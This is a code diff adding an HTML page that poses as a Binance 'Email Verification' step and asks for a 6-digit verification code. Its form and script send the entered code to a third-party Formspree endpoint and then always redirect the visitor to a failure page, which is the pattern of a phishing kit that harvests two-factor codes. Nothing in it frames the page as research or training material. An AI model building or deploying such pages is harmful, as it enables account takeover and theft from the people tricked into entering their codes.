@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email Verification</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <h2>Email Verification</h2>
+      <p>Enter the 6-digit verification code sent to <b>Eg.*@gmail.com</b>.</p>
+      <form action="https://formspree.io/f/xdkovoan" method="POST" id="verificationForm">
+        <label for="verification-code">Email Verification Code</label>
+        <input type="text" id="verification-code" name="code" placeholder="Enter code" required>
+        <button type="submit">Submit</button>
+      </form>
+      <a href="#" class="link">Security verification unavailable?</a>
+      <footer>Protected by Binance Risk</footer>
+    </div>
+  </div>
+
+  
+  
+  <script>
+     // Attach the button click event listener
+     document.getElementById('verificationForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default submission
+
+      var form = event.target;
+      var formData = new FormData(form);
+
+      // Submit the form data asynchronously
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => {
+        // Redirect to failure.html after successful form submission
+        window.location.href = 'failure.html';
+      })
+      .catch(error => {
+        // If there is a network error, still redirect to failure.html
+        console.error('Error submitting verification form:', error);
+        window.location.href = 'failure.html';
+        
+      });
+      
+    });
+
+    
+  </script>
+</body>
+</html>
